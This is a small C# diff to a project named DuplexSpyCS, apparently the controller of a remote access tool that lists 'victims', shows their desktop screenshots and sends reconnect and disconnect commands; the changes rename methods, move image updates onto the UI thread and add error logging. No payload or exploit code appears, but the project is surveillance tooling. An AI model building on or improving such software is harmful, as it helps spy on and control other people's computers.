@@ -223,7 +223,7 @@ namespace DuplexSpyCS
 
                             ListViewItem k = listView2.FindItemWithText(online_id);
                             if (k != null)
-                                GetVictim(k).Disconnect();
+                                GetVictim(k).fnDisconnect();
 
                             MakeNewPortfolio(v);
 
@@ -249,20 +249,27 @@ namespace DuplexSpyCS
                             Image img = clsTools.Base64ToImage(cmd[10]);
                             Bitmap bmp = new Bitmap(img, new Size(255, 255));
 
-                            string szGuid = Guid.NewGuid().ToString();
-                            if (il_screen.Images.ContainsKey(v.ID))
+                            listView1.Invoke(() =>
                             {
-                                il_screen.Images.Add(szGuid, il_screen.Images[v.ID]);
-                                x.ImageKey = szGuid;
-                                il_screen.Images.RemoveByKey(v.ID);
-                            }
+                                listView1.BeginUpdate();
 
-                            il_screen.Images.Add(v.ID, bmp);
-                            x.ImageKey = v.ID;
-                            if (il_screen.Images.ContainsKey(szGuid))
-                                il_screen.Images.RemoveByKey(szGuid);
+                                string szGuid = Guid.NewGuid().ToString();
+                                if (il_screen.Images.ContainsKey(v.ID))
+                                {
+                                    il_screen.Images.Add(szGuid, il_screen.Images[v.ID]);
+                                    x.ImageKey = szGuid;
+                                    il_screen.Images.RemoveByKey(v.ID);
+                                }
 
-                            v.img_LastDesktop = bmp;
+                                il_screen.Images.Add(v.ID, bmp);
+                                x.ImageKey = v.ID;
+                                if (il_screen.Images.ContainsKey(szGuid))
+                                    il_screen.Images.RemoveByKey(szGuid);
+
+                                v.img_LastDesktop = bmp;
+
+                                listView1.EndUpdate();
+                            });
 
                             List<ListViewItem> lsItem = new List<ListViewItem>();
                             foreach (ListViewItem item in listView1.Items)
@@ -1465,7 +1472,7 @@ namespace DuplexSpyCS
                 }
                 catch (Exception ex)
                 {
-
+                    clsStore.sql_conn.WriteErrorLogs(v, ex.Message);
                 }
             }));
         }
@@ -2076,7 +2083,7 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in listView1.SelectedItems)
             {
                 clsVictim v = GetVictim(item);
-                v.Send(0, 1, string.Empty);
+                v.fnReconnect();
             }
         }
         //Disconnect
@@ -2085,7 +2092,7 @@ namespace DuplexSpyCS
             foreach (ListViewItem item in listView1.SelectedItems)
             {
                 clsVictim v = GetVictim(item);
-                v.Send(0, 0, string.Empty);
+                v.fnDisconnect();
             }
         }
 
